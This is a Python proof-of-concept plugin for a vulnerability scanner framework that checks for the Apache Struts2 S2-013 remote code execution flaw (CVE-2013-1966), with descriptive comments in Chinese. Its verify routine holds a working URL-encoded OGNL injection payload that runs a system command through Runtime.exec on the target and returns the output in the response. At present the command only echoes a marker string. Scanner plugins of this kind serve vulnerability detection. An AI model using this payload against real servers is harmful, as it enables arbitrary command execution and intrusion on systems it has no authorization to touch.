# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Apache_Struts_0003_p'  # 平台漏洞编号，留空
    name = 'Apache Struts2 S2-013远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2013-05-24'  # 漏洞公布时间
    desc = '''
        Apache Struts2中存在漏洞，该漏洞源于s:a和s:url标签都提供了一个includeParams属性。此属性允许使用的值包括none、get、all。当该属性被设置为get或all时，Apache Struts2会将用户提交的参数值作为Ognl表达式执行。攻击者可通过提交带有恶意的Ongl表达式，利用该漏洞执行任意Java代码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2013-05924'  # 漏洞来源
    cnvd_id = 'CNVD-2013-05924'  # cnvd漏洞编号
    cve_id = 'CVE-2013-1966'  # cve编号
    product = 'Apache-Struts'  # 漏洞应用名称
    product_version = 'Apache Struts2.0.0 - 2.3.14.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3abc9209-c9ed-40eb-ae59-beb390a38826'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:

            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = {'a': '%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27echo 92933839f1efb2da9a4799753ee8d79c%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'}
            request = requests.get(
                '{target}/link.action'.format(target=self.target), params=payload)
            r = request.text
            if '92933839f1efb2da9a4799753ee8d79c' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
